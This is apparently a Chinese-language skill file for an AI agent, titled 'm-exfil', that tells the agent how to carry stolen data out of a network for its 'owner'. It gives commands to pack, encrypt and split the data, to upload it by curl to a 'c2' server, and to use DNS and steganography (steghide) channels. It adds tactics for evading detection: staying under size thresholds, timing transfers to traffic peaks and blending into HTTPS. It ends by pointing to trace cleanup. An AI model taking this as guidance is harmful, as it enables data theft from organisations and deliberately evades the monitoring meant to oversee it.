---
name: m-exfil
description: "数据外泄/Exfiltration：云上传、加密传输、隐写、DNS 外泄、定时外泄、大小限制规避。"
---

# m-exfil · 数据外泄 / Exfiltration

被读到时：主人要把拿到的数据带出来，绕出站限制、不被发现。

## 顺序

数据定位 → 打包 → 选通道 → 分片 → 外泄 → 清痕迹

## 一、打包与压缩

```bash
# 打包 + 加密
tar czf - target_dir | openssl enc -aes-256-cbc -salt -pass pass:KEY | base64 -w0 > out.b64
# 分片（绕单包大小限制）
split -b 500k out.b64 part_
```

## 二、外泄通道

| 通道 | 方式 |
|---|---|
| HTTP POST | `curl -X POST -d @data https://c2/upload` |
| 云存储 | 上传到自建 S3/OSS/网盘 API |
| DNS | 把数据编码进 DNS 查询（dnscat2 / 自写） |
| 隐写 | 藏进图片/音频（steghide 最新版） |
| 加密传输 | 全程 TLS + 自定义加密 |

```bash
# HTTP 分段上传
curl -s -T part_aa https://c2/upload/part_aa
# 隐写
steghide embed -cf cover.jpg -ef secret.txt -p PASS
steghide extract -sf cover.jpg -p PASS
```

## 三、规避检测

- 控制单次传输大小（低于阈值）
- 分时段（模拟正常流量高峰期）
- 走正常协议（HTTPS 混在正常流量里）

## 四、验收

- 数据完整落地（校验 sha256 前后一致）
- 通道没被拦（记录每次传输状态）
- 源头痕迹清理（见 m-forensics）

工具取最新版。
